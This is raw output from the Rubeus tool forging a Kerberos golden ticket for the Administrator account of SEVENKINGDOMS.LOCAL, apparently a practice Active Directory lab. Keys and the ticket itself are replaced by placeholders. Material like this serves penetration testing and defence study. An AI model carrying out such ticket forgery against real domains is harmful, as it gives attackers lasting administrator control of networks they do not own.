
   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  <VERSION>
[*] Action: Build TGT

[*] Building PAC

[*] Domain         : SEVENKINGDOMS.LOCAL (SEVENKINGDOMS)
[*] SID            : S-1-5-21-1004336348-1177238915-682003330
[*] UserId         : 500
[*] Groups         : 520,512,513,519,518
[*] ServiceKey     : <KEY>
[*] ServiceKeyType : KERB_CHECKSUM_HMAC_MD5
[*] KDCKey         : <KEY32>
[*] KDCKeyType     : KERB_CHECKSUM_HMAC_MD5
[*] Service        : krbtgt
[*] Target         : sevenkingdoms.local

[*] Generating EncTicketPart
[*] Signing PAC
[*] Encrypting EncTicketPart
[*] Generating Ticket
[*] Generated KERB-CRED
[*] Forged a TGT for 'Administrator@sevenkingdoms.local'

[*] AuthTime       : <TIMESTAMP>
[*] StartTime      : <TIMESTAMP>
[*] EndTime        : <TIMESTAMP>
[*] RenewTill      : <TIMESTAMP>

[*] base64(ticket.kirbi):

  <KIRBI>

